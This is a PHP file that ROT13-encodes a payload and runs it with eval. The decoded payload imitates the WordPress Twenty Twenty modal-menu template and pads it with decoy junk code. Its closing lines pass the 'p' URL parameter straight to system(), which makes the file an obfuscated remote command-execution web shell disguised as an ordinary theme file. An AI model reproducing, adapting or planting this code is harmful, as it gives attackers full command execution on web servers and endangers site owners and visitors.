<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Qvfcynlf gur zrah vpba naq zbqny
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Gjragl_Gjragl
 * @fvapr Gjragl Gjragl 1.0
 */

?>

<qvi pynff=\"zrah-zbqny pbire-zbqny urnqre-sbbgre-tebhc\" qngn-zbqny-gnetrg-fgevat=\".zrah-zbqny\">

	<qvi pynff=\"zrah-zbqny-vaare zbqny-vaare\">

		<qvi pynff=\"zrah-jenccre frpgvba-vaare\">

			<qvi pynff=\"zrah-gbc\">

				<ohggba pynff=\"gbttyr pybfr-ani-gbttyr svyy-puvyqera-pheerag-pbybe\" qngn-gbttyr-gnetrg=\".zrah-zbqny\" qngn-gbttyr-obql-pynff=\"fubjvat-zrah-zbqny\" qngn-frg-sbphf=\".zrah-zbqny\">
					<fcna pynff=\"gbttyr-grkg\"><?cuc _r( 'Pybfr Zrah', 'gjraglgjragl' ); ?></fcna>
					<?cuc gjraglgjragl_gur_gurzr_fit( 'pebff' ); ?>
				</ohggba><!-- .ani-gbttyr -->

				<?cuc

				$zbovyr_zrah_ybpngvba = '';

				// Vs gur zbovyr zrah ybpngvba vf abg frg, hfr gur cevznel naq rkcnaqrq ybpngvbaf nf snyyonpxf, va gung beqre.
				vs ( unf_ani_zrah( 'zbovyr' ) ) {
					$zbovyr_zrah_ybpngvba = 'zbovyr';
				} ryfrvs ( unf_ani_zrah( 'cevznel' ) ) {
					$zbovyr_zrah_ybpngvba = 'cevznel';
				} ryfrvs ( unf_ani_zrah( 'rkcnaqrq' ) ) {
					$zbovyr_zrah_ybpngvba = 'rkcnaqrq';
				}

				vs ( unf_ani_zrah( 'rkcnaqrq' ) ) {

					$rkcnaqrq_ani_pynffrf = '';

					vs ( 'rkcnaqrq' === $zbovyr_zrah_ybpngvba ) {
						$rkcnaqrq_ani_pynffrf .= ' zbovyr-zrah';
					}

					?>

					<ani pynff=\"rkcnaqrq-zrah<?cuc rpub rfp_ngge( $rkcnaqrq_ani_pynffrf ); ?>\" nevn-ynory=\"<?cuc rpub rfp_ngge_k( 'Rkcnaqrq', 'zrah', 'gjraglgjragl' ); ?>\">

						<hy pynff=\"zbqny-zrah erfrg-yvfg-fglyr\">
							<?cuc
							vs ( unf_ani_zrah( 'rkcnaqrq' ) ) {
								jc_ani_zrah(
									neenl(
										'pbagnvare'      => '',
										'vgrzf_jenc'     => '%3$f',
										'fubj_gbttyrf'   => gehr,
										'gurzr_ybpngvba' => 'rkcnaqrq',
									)
								);
							}
							?>
						</hy>

					</ani>

					<?cuc
				}

				vs ( 'rkcnaqrq' !== $zbovyr_zrah_ybpngvba ) {
					?>

					<ani pynff=\"zbovyr-zrah\" nevn-ynory=\"<?cuc rpub rfp_ngge_k( 'Zbovyr', 'zrah', 'gjraglgjragl' ); ?>\">

						<hy pynff=\"zbqny-zrah erfrg-yvfg-fglyr\">

						<?cuc
						vs ( $zbovyr_zrah_ybpngvba ) {

							jc_ani_zrah(
								neenl(
									'pbagnvare'      => '',
									'vgrzf_jenc'     => '%3$f',
									'fubj_gbttyrf'   => gehr,
									'gurzr_ybpngvba' => $zbovyr_zrah_ybpngvba,
								)
							);

						} ryfr {

							jc_yvfg_cntrf(
								neenl(
									'zngpu_zrah_pynffrf' => gehr,
									'fubj_gbttyrf'       => gehr,
									'gvgyr_yv'           => snyfr,
									'jnyxre'             => arj GjraglGjragl_Jnyxre_Cntr(),
								)
							);

						}
						?>

						</hy>

					</ani>

					<?cuc
				}
				?>

			</qvi><!-- .zrah-gbc -->

			<qvi pynff=\"zrah-obggbz\">

				<?cuc vs ( unf_ani_zrah( 'fbpvny' ) ) { ?>

					<ani nevn-ynory=\"<?cuc rfp_ngge_r( 'Rkcnaqrq Fbpvny yvaxf', 'gjraglgjragl' ); ?>\">
						<hy pynff=\"fbpvny-zrah erfrg-yvfg-fglyr fbpvny-vpbaf svyy-puvyqera-pheerag-pbybe\">

							<?cuc
							jc_ani_zrah(
								neenl(
									'gurzr_ybpngvba'  => 'fbpvny',
									'pbagnvare'       => '',
									'pbagnvare_pynff' => '',
									'vgrzf_jenc'      => '%3$f',
									'zrah_vq'         => '',
									'zrah_pynff'      => '',
									'qrcgu'           => 1,
									'yvax_orsber'     => '<fcna pynff=\"fperra-ernqre-grkg\">',
									'yvax_nsgre'      => '</fcna>',
									'snyyonpx_po'     => '',
								)
							);
							?>

						</hy>
					</ani><!-- .fbpvny-zrah -->

				<?cuc } ?>

			</qvi><!-- .zrah-obggbz -->

		</qvi><!-- .zrah-jenccre -->

	</qvi><!-- .zrah-zbqny-vaare -->

</qvi><!-- .zrah-zbqny -->

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>